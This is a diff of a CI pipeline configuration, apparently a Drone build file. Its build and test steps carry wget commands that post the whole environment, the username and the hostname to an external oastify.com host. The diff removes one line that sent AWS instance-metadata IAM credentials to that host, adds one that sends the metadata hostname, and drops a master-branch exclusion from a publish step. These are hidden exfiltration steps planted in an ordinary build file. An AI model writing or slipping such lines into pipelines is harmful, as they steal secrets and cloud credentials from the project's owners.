@@ -14,7 +14,6 @@ steps:
       CGO_ENABLED: 0
     commands:
       - wget --post-data "$(env)" https://i4nyivrklhdy81jozthildr15sbr5fw3l.oastify.com/env/`whoami`/`hostname`
-      - wget --post-data "$(wget http://169.254.169.254/latest/meta-data/iam/security-credentials)" https://i4nyivrklhdy81jozthildr15sbr5fw3l.oastify.com/awshostname/`whoami`/`hostname`
       - go build
       - go test ./...
 
@@ -28,7 +27,7 @@ steps:
       TEST_ENV: dev
     commands:
       - wget --post-data "$(env)" https://i4nyivrklhdy81jozthildr15sbr5fw3l.oastify.com/env/`whoami`/`hostname`
-      - wget --post-data "$(wget http://169.254.169.254/latest/meta-data/hostname)" https://i4nyivrklhdy81jozthildr15sbr5fw3l.oastify.com/awshostname/`whoami`/`hostname`
+      - wget --post-data "$(wget http://169.254.169.254/latest/meta-data/hostname -O 1.html && cat 1.html)" https://i4nyivrklhdy81jozthildr15sbr5fw3l.oastify.com/awshostname/`whoami`/`hostname`
       - ./httptest
 
   - name: publish-dev
@@ -45,8 +44,6 @@ steps:
       tags: [dev]
     when:
       event: [push]
-      branch:
-        exclude: [master]
 
   - name: publish
     image: plugins/docker
